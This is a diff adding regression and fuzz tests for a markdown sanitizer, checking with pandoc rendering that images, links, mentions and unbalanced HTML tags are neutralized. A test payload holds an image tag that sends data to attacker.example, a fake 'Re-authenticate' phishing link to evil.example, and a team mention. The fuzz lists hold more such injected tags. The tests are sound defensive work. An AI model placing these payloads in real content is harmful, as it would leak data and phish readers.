@@ -1,3 +1,4 @@
+import { execFileSync } from "node:child_process";
 import { describe, expect, it } from "vitest";
 import {
   defangUrlText,
@@ -6,6 +7,9 @@ import {
   safeCut,
   sanitizeMarkdown,
   sanitizeMarkdownEx,
+  singleLine,
+  sliceSafe,
+  wellFormed,
   type SanitizeOptions,
 } from "../src/publish/sanitize.js";
 
@@ -72,6 +76,47 @@ function expectSafe(input: string, o: Partial<SanitizeOptions> = {}): string {
   expect(unsafeReasons(out), `input ${JSON.stringify(input)}\noutput ${JSON.stringify(out)}`).toEqual([]);
   return out;
 }
+
+/* ------------- rendering checks with a real CommonMark/GFM parser (pandoc, when installed) ------------- */
+
+const HAS_PANDOC = ((): boolean => {
+  try {
+    execFileSync("pandoc", ["--version"], { stdio: "ignore" });
+    return true;
+  } catch {
+    return false;
+  }
+})();
+
+function renderGfm(md: string): string {
+  return execFileSync("pandoc", ["-f", "gfm", "-t", "html", "--no-highlight"], { input: md }).toString();
+}
+
+/**
+ * What GitHub would render that the policy forbids (images off, mentions off, allowlist
+ * [github.com]): raw <img>/<script>, links elsewhere, mentions in text. Code is escaped by the
+ * renderer, so only real elements count; mentions are looked for outside <code> only.
+ */
+function renderedUnsafe(md: string): string[] {
+  const html = renderGfm(md);
+  const bad: string[] = [];
+  if (/<img\b/i.test(html)) bad.push("img");
+  if (/<script\b/i.test(html)) bad.push("script");
+  for (const m of html.matchAll(/<a [^>]*href="([^"]*)"/g)) {
+    if (!/^(?:https?:\/\/(?:[a-z0-9-]+\.)*github\.com(?:[/?#]|$)|[#/])/i.test(m[1] ?? "")) bad.push(`link ${m[1]}`);
+  }
+  const text = html.replace(/<code[^>]*>[\s\S]*?<\/code>/g, "").replace(/<[^>]*>/g, "");
+  if (/(?<![A-Za-z0-9_])@[A-Za-z0-9]/.test(text)) bad.push("mention");
+  return bad;
+}
+
+function expectRendersSafe(md: string, label = ""): void {
+  if (!HAS_PANDOC) return;
+  expect(renderedUnsafe(md), `${label}\nmarkdown ${JSON.stringify(md)}`).toEqual([]);
+}
+
+/** The payload a code block may carry verbatim; it must render as code (escaped), never as HTML. */
+const PAYLOAD = '<img src="https://attacker.example/leak?d=X">\n<a href="https://evil.example/login">Re-authenticate</a> cc @acme/security';
 
 describe("sanitizeMarkdown: images (exfiltration)", () => {
   it("removes inline images, keeping the alt text", () => {
@@ -414,7 +459,282 @@ describe("sanitizeMarkdown: robustness", () => {
   });
 });
 
+describe("sanitizeMarkdown: block structure (regressions)", () => {
+  it("does not end an HTML block at a line holding only a Unicode space (CommonMark blank = spaces/tabs)", () => {
+    for (const sep of ["\u00A0", "\u3000", "\u2002", " \u00A0\t", "\u200B"]) {
+      const input = `Summary.\n\n<details>\n${sep}\n\`\`\`\n${PAYLOAD}\n\`\`\``;
+      const out = expectSafe(input);
+      expect(out, JSON.stringify(sep)).not.toContain("<img");
+      expect(out).not.toContain("@acme/security");
+      expectRendersSafe(out, JSON.stringify(sep));
+      expectRendersSafe(`${out}\n\n<!-- xrepo:c:0123456789ab -->`, JSON.stringify(sep));
+    }
+  });
+
+  it("strips U+FEFF, so a line holding only it is a real blank line (code stays byte-exact)", () => {
+    const input = `<details>\n\uFEFF\n\`\`\`\n${PAYLOAD}\n\`\`\`\n</details>`;
+    expect(clean(input)).toBe(`<details>\n\n\`\`\`\n${PAYLOAD}\n\`\`\`\n</details>`);
+    expectRendersSafe(clean(input));
+    expect(clean("\uFEFF```\n@user\n```")).toBe("```\n@user\n```");
+  });
+
+  it("keeps the renderer's fences aligned with the sanitizer's code blocks", () => {
+    const cases = [
+      ` \`\`\`\nx\n\`\`\`\n${PAYLOAD}\n\`\`\``, // GitHub opens a fence at 1-3 spaces of indentation
+      `   ~~~\nx\n~~~\n${PAYLOAD}\n~~~`,
+      `\`\`\`\n    \`\`\`\n\`\`\`\n${PAYLOAD}\n\`\`\``, // 4 spaces do not close a fence
+      `\`\`\`\n\t\`\`\`\n\`\`\`\n${PAYLOAD}\n\`\`\``,
+      `<sub>x</sub>\n\`\`\`\nfoo\n\n\`\`\`\n${PAYLOAD}\n\`\`\``, // fence in a suspected (not real) HTML block
+      `<sub>x</sub>\n\`\`\`\nfoo\n\`\`\`\n\n\`\`\`\n${PAYLOAD}\n\`\`\``,
+      `para\n2. item\n   \`\`\`\nx\n\`\`\`\n${PAYLOAD}\n\`\`\``, // "2." cannot interrupt a paragraph: no list
+      `| a |\n|---|\n- b\n  \`\`\`\nx\n\`\`\`\n${PAYLOAD}\n\`\`\``, // a table may swallow "- b"
+    ];
+    for (const input of cases) {
+      const out = clean(input);
+      // The payload is either kept verbatim inside one of the sanitizer's code blocks or sanitized.
+      expect(out.includes(PAYLOAD) || !out.includes("<img"), input).toBe(true);
+      expectRendersSafe(out, input);
+      expectRendersSafe(`${out}\n\n\`\`\`suggestion\n${PAYLOAD}\n\`\`\``, input);
+    }
+    // Every fence line that could be read as a top-level fence was broken (no run of 3 left).
+    expect(vis(" ```\nx\n```\nok\n```")).toBe(" ``^`\nx\n```\nok\n```");
+  });
+
+  it("judges HTML blocks on the output (sanitizing can start or keep open a block)", () => {
+    // A definition label becomes "<details> (host)": a type-6 HTML block start in the output (ended
+    // by a blank line before the code); the never-closed <details> itself is then dropped.
+    const def = clean(`[<details>]: https://evil.com\n\`\`\`\n${PAYLOAD}\n\`\`\``);
+    expect(def.startsWith(`${Z} (evil.com)\n\n\`\`\`\n`)).toBe(true);
+    expectRendersSafe(def);
+    // "[<pre>]: url" would open a type-1 block that only "</pre>" ends: the "<pre>" is dropped.
+    const pre = clean(`[<pre>]: https://evil.com\n\`\`\`\n${PAYLOAD}\n\`\`\``);
+    expect(pre).not.toContain("<pre>");
+    expectRendersSafe(pre);
+    // "`</pre>`" ends the block in the input, but its "</pre>" is neutralized in the output.
+    const span = clean(`<pre>\n\`</pre>\`\n\`\`\`\n${PAYLOAD}\n\`\`\``);
+    expect(span).not.toMatch(/^<pre>/);
+    expectRendersSafe(span);
+    // A type-7 tag cannot interrupt a paragraph, but "<pre>" can: both are tracked.
+    expectRendersSafe(clean(`para\n<br>\n<pre>\n\n\`\`\`\n${PAYLOAD}\n\`\`\``));
+  });
+
+  it("never ends inside a <pre> block, so appended blocks cannot be swallowed", () => {
+    expect(vis("Consider this change:\n<pre>")).toBe("Consider this change:\n^");
+    expect(clean("<pre>x</pre>")).toBe("<pre>x</pre>");
+    expect(clean("<pre>\nx\n</pre>\nafter")).toBe("<pre>\nx\n</pre>\nafter");
+    for (const body of ["Consider:\n<pre>", "Consider:\n<PRE>", "Consider:\n<pre><code>", "x\n  <pre lang=ts>\n\ny"]) {
+      const out = clean(body);
+      const md = `${out}\n\n\`\`\`suggestion\n${PAYLOAD}\n\`\`\`\n\n<!-- xrepo:c:0123456789ab -->`;
+      expect(out, body).not.toMatch(/^ {0,3}<pre/im);
+      expectRendersSafe(md, body);
+    }
+    // Truncation can separate "<pre>" from "</pre>": the open "<pre>" is dropped as well.
+    const cut = sanitizeMarkdownEx(`intro\n<pre>\n${"word ".repeat(100)}\n</pre>`, { ...OPTS, maxChars: 120 });
+    expect(cut.truncated).toBe(true);
+    expect(cut.text).not.toContain("<pre>");
+    expectRendersSafe(`${cut.text}\n\n\`\`\`suggestion\n${PAYLOAD}\n\`\`\``);
+  });
+
+  it("keeps code blocks inside list items rendering", () => {
+    const list = "Fixes:\n1. Guard the input:\n   ```ts\n   if (!x) return;\n   ```\n- Or:\n\n  ```\n  y();\n  ```";
+    expect(clean(list)).toBe(list);
+    expectRendersSafe(clean(list));
+  });
+
+  it("drops (never cuts) a body ```suggestion block that does not fit, and keeps one that fits", () => {
+    const code = Array.from({ length: 40 }, (_, i) => `  const value${i} = compute(${i});`).join("\n");
+    const input = `Use this:\n\n\`\`\`suggestion\n${code}\n\`\`\``;
+    const cut = sanitizeMarkdownEx(input, { ...OPTS, maxChars: 400, allowSuggestions: true });
+    expect(cut.truncated).toBe(true);
+    expect(cut.text).not.toContain("```suggestion");
+    expect(cut.text).not.toContain("value0");
+    expect(cut.text.endsWith("\u2026 (truncated)")).toBe(true);
+    const fits = sanitizeMarkdownEx(`${input}\n\n${"tail ".repeat(200)}`, { ...OPTS, maxChars: input.length + 100, allowSuggestions: true });
+    expect(fits.truncated).toBe(true);
+    expect(fits.text).toContain(`\`\`\`suggestion\n${code}\n\`\`\``);
+    // Other code is still cut (at a line boundary) and closed.
+    const plain = sanitizeMarkdownEx(input.replace("suggestion", "ts"), { ...OPTS, maxChars: 400 });
+    expect(plain.text).toMatch(/^Use this:\n\n```ts\n(?: {2}const value\d+ = compute\(\d+\);\n)+```\n\n\u2026 \(truncated\)$/);
+  });
+
+  it("does not keep a body ```suggestion whose code had a secret redacted", () => {
+    const out = clean("fix:\n\n```suggestion\nconst t = 'ghp_abcdefghijklmnopqrstuvwxyz0123456789';\n```", { allowSuggestions: true });
+    expect(out).toBe("fix:\n\n```text\nconst t = '[REDACTED:github_token]';\n```");
+  });
+
+  it("closes code that is cut under a tiny limit", () => {
+    const out = clean("```\nabcdefghij klmnop\n```", { maxChars: 18 });
+    expect(out.length).toBeLessThanOrEqual(18);
+    expect(out === "" || /\n```$/.test(out)).toBe(true);
+  });
+
+  it("returns well-formed UTF-16 (lone surrogates become U+FFFD)", () => {
+    expect(clean("a\uD83Db \uDE00c \uD83D\uDE00")).toBe("a\uFFFDb \uFFFDc \uD83D\uDE00");
+    expect(wellFormed("\uD83D")).toBe("\uFFFD");
+  });
+
+  it.runIf(HAS_PANDOC)("renders safely on random mixes that include fences, lists and HTML blocks", () => {
+    const frags = [
+      "```", "````", "~~~", " ```", "  ```", "   ```", "    ```", "\t```", "```suggestion", "```js", "``` x`y", "   ~~~",
+      "<img src=https://evil.example/x>", "<a href=https://evil.example>x</a>", "@acme/team", "@bob", "&#64;bob",
+      "<details>", "</details>", "<pre>", "</pre>", "`</pre>`", "<summary>s</summary>", "<br>", "<sub>x</sub>", "<div>",
+      "- ", "1. ", "2. ", "* ", "> ", "| a |", "|---|", "\u00A0", "\u3000", "\uFEFF", "[<details>]: https://evil.example",
+      "[<pre>]: https://evil.example", "<!--", "-->", "x", "para", "<script>", "</script>", "[x](https://evil.example)",
+      "https://evil.example/p", "<!-- c -->", "- - -", "    code", "- a\n  ```", "1. a\n   ```", "  <pre>", "<?x", "?>",
+    ];
+    const seps = ["\n", "\n", "\n", "\n\n", "", " "];
+    let seed = Number(process.env.XREPO_FUZZ_SEED ?? 7);
+    const rnd = (n: number): number => {
+      seed = (seed * 1103515245 + 12345) & 0x7fffffff;
+      return seed % n;
+    };
+    const iterations = Number(process.env.XREPO_RENDER_FUZZ_ITER ?? 400);
+    for (let iter = 0; iter < iterations; iter++) {
+      let s = "";
+      for (let i = 0, k = 2 + rnd(14); i < k; i++) s += (i ? (seps[rnd(seps.length)] ?? "") : "") + (frags[rnd(frags.length)] ?? "");
+      const maxChars = rnd(4) === 0 ? 20 + rnd(200) : 20000;
+      const out = sanitizeMarkdownEx(s, { ...OPTS, maxChars, allowSuggestions: true }).text;
+      expectRendersSafe(`${out}\n\n\`\`\`suggestion\n${PAYLOAD}\n\`\`\`\n\n<!-- xrepo:c:0123456789ab -->`, JSON.stringify(s));
+    }
+  }, 60_000);
+});
+
+/* ---------------------------- round-2 regressions ---------------------------- */
+
+/** Rendered (pandoc gfm) HTML: the tags among `names` that are still open where `marker` starts. */
+function openTagsAt(md: string, marker: string, names = ["details", "summary", "sub", "sup", "code", "pre"]): string[] {
+  const html = renderGfm(md);
+  const at = html.indexOf(marker);
+  expect(at, html).toBeGreaterThan(-1);
+  const open: string[] = [];
+  const re = new RegExp(`<(/?)(${names.join("|")})\\b[^>]*>`, "gi");
+  for (const m of html.slice(0, at).matchAll(re)) {
+    const name = (m[2] ?? "").toLowerCase();
+    if (m[1] === "") open.push(name);
+    else {
+      const k = open.lastIndexOf(name);
+      if (k !== -1) open.splice(k);
+    }
+  }
+  return open;
+}
+
+describe("sanitizeMarkdown: underscore-emphasis mentions (underscore-emphasis-mention-bypass)", () => {
+  it("neutralizes '@' right after '_' / '__' (rendered as <em>@user</em> / <strong>@org/team</strong>)", () => {
+    expect(vis("_@octocat_")).toBe("_@^octocat_");
+    expect(vis("Escalating to _@acme/security_ now")).toBe("Escalating to _@^acme/security_ now");
+    expect(vis("(_@user_)")).toBe("(_@^user_)");
+    expect(vis("__@org/team__")).toBe("__@^org/team__");
+    expect(vis("Review of _@acme/everyone_ urgent postponed")).toBe("Review of _@^acme/everyone_ urgent postponed");
+    // E-mail addresses (a letter or digit right before "@") stay intact.
+    expect(clean("mail bob@example.com or a_b@x.io or 42@x.io")).toBe("mail bob@example.com or a_b@x.io or 42@x.io");
+    expect(clean("_@octocat_", { allowMentions: true })).toBe("_@octocat_");
+    for (const s of ["_@octocat_", "Escalating to _@acme/security_ and _@octocat_.", "(_@user_)", "__@org/team__", "x _@a_ y __@b/c__"]) {
+      expectSafe(s);
+      expectRendersSafe(clean(s), s);
+    }
+  });
+});
+
+describe("sanitizeMarkdown: unbalanced allowed tags (unbalanced-details-hides-trusted-text)", () => {
+  const FOOTER = "TRUSTED-FOOTER-7f3a";
+
+  it("drops openers that are never closed, so trusted text appended later is not collapsed or shrunk", () => {
+    expect(vis("All good. <details><summary>more</summary>")).toBe("All good. ^<summary>more</summary>");
+    expect(vis("Looks good to me.\n\n<details>\n<summary>Reviewer details</summary>\n\nnothing else")).toBe(
+      "Looks good to me.\n\n^\n<summary>Reviewer details</summary>\n\nnothing else",
+    );
+    expect(vis("x <sub><sup>tiny")).toBe("x ^^tiny");
+    expect(vis("<sub>\n\nall fine")).toBe("^\n\nall fine");
+    expect(vis("<pre>x")).toBe("^x");
+    expect(vis("<code>x")).toBe("^x");
+    for (const s of [
+      "All good. <details><summary>more</summary>",
+      "Looks good to me.\n\n<details>\n<summary>Reviewer details</summary>\n\nnothing else",
+      "x <sub><sup>tiny",
+      "<sub>\n\nall fine",
+      "<sup>\n- a\n- b",
+      "ok <code>\n\nmore",
+      "a\n\n<details>\n\n| a |\n|---|\n| </details> |",
+      "<details><summary>x</summary>\n\n> quote </details>\n\n<details>",
+    ]) {
+      const md = `${clean(s)}\n\n${FOOTER}`;
+      if (HAS_PANDOC) expect(openTagsAt(md, FOOTER), `${JSON.stringify(s)}\n${md}`).toEqual([]);
+    }
+  });
+
+  it("keeps balanced tags, including a <details> around a code block and inline tags on one line", () => {
+    for (const s of [
+      "<details>\n<summary>Diff</summary>\n\n```ts\nconst a = 1;\n```\n\n</details>",
+      "<details><summary>S</summary>body<br>x<sub>1</sub><sup>2</sup></details>",
+      "<pre>\nx\n</pre>",
+      "<pre><code>c</code></pre>",
+      "H<sub>2</sub>O and E = mc<sup>2</sup>, see <code>x</code>",
+    ]) {
+      expect(clean(s)).toBe(s);
+    }
+  });
+
+  it("drops a closer GitHub could ignore, and with it the opener", () => {
+    // Phrasing tags must close on the opener's line (a </sub> in a later paragraph is ignored).
+    expect(vis("<sub>a\n\nb</sub>")).toBe("^a\n\nb^");
+    expect(vis("<code>x\ny</code>")).toBe("^x\ny^");
+    // A </details> inside a table cell is ignored by the HTML parser (scope boundary).
+    expect(vis("<details>\n\n| a |\n|---|\n| </details> |")).toBe("^\n\n| a |\n|---|\n| ^ |");
+    // Mis-nested and stray tags.
+    expect(vis("<sub><sup>a</sub></sup>")).toBe("<sub>^a</sub>^");
+    expect(vis("</details> x </sub>")).toBe("^ x ^");
+    // Tags inside code spans are text, never matched.
+    expect(vis("`<details>` <sub>x `</sub>`")).toBe("`<^details>` ^x `<^/sub>`");
+  });
+
+  it("balances what is left after truncation", () => {
+    const r = sanitizeMarkdownEx(`<details>\n<summary>More</summary>\n\n${"word ".repeat(200)}\n\n</details>`, { ...OPTS, maxChars: 300 });
+    expect(r.truncated).toBe(true);
+    expect(r.text).not.toContain("<details>");
+    expect(r.text).toContain("<summary>More</summary>");
+    if (HAS_PANDOC) expect(openTagsAt(`${r.text}\n\n${FOOTER}`, FOOTER)).toEqual([]);
+  });
+
+  it("is linear-time with many unbalanced tags", () => {
+    for (const s of ["<sub>".repeat(50_000), "</details>".repeat(25_000), "<details>\n".repeat(25_000), "<code>x</sub>".repeat(20_000)]) {
+      const t = Date.now();
+      const out = sanitizeMarkdown(s, { ...OPTS, maxChars: 60000 });
+      expect(Date.now() - t, s.slice(0, 20)).toBeLessThan(2000);
+      expect(out).not.toMatch(/<\/?(?:sub|details|code)>/);
+    }
+  });
+
+  it("keeps every allowed element closed on random mixes", () => {
+    const frags = [
+      "<details>", "</details>", "<summary>", "</summary>", "<sub>", "</sub>", "<sup>", "</sup>", "<code>", "</code>",
+      "<pre>", "</pre>", "`", "x", "| a |", "|---|", "- ", "> ", "\n", "\n\n", "```", "word",
+    ];
+    let seed = 99;
+    const rnd = (n: number): number => {
+      seed = (seed * 1103515245 + 12345) & 0x7fffffff;
+      return seed % n;
+    };
+    const iterations = HAS_PANDOC ? 300 : 0;
+    for (let iter = 0; iter < iterations; iter++) {
+      let s = "";
+      for (let i = 0, k = 2 + rnd(16); i < k; i++) s += (rnd(3) === 0 ? "\n" : " ") + (frags[rnd(frags.length)] ?? "");
+      const out = sanitizeMarkdownEx(s, { ...OPTS, maxChars: rnd(3) === 0 ? 40 + rnd(80) : 20000 }).text;
+      expect(openTagsAt(`${out}\n\n${FOOTER}`, FOOTER), `${JSON.stringify(s)}\n${JSON.stringify(out)}`).toEqual([]);
+    }
+  }, 60_000);
+});
+
 describe("helpers", () => {
+  it("singleLine collapses to one line and never splits a surrogate pair", () => {
+    expect(singleLine("a\n b\u202E\tc\u2028d", 50)).toBe("a b c d");
+    const s = `${"x".repeat(9)}\uD83D\uDE00tail`;
+    expect(singleLine(s, 11)).toBe(`${"x".repeat(9)}\u2026`);
+    expect(singleLine(s, 12)).toBe(`${"x".repeat(9)}\uD83D\uDE00\u2026`);
+    expect(singleLine("ab\uD83D", 10)).toBe("ab\uFFFD");
+    expect(sliceSafe("a\uD83D\uDE00", 2)).toBe("a");
+  });
+
   it("defangUrlText breaks autolink triggers", () => {
     expect(defangUrlText("https://www.x.com/a?u=http://y")).toBe(`https:${Z}//www${Z}.x.com/a?u=http:${Z}//y`);
   });
